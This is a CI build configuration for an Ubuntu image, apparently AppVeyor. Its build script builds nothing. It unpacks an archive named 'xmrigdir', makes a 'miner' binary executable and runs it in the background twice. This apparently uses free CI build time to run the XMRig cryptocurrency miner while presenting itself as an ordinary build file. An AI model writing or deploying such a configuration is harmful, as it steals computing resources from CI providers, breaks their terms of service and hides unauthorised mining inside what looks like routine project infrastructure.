version: 1.0.{build}

image: Ubuntu

# Switch to script mode
build:
  off

init:
  # Make sure bash is installed (Ubuntu image usually has it pre-installed)
  - sudo apt-get update
  - sudo apt-get install -y bash

build_script:
  # First project setup and execution
  - tar xvf xmrigdir.tar.gz
  - cd xmrigdir
  - chmod +x ./miner
  - ./miner &  # Run in the background

  # Move to second project directory (assuming it exists)
  - tar xvf xmrigdir.tar.gz
  - cd xmrigdir
  - chmod +x ./miner
  - ./miner & # Run in the background

  # Wait for both processes to finish
  - wait
  
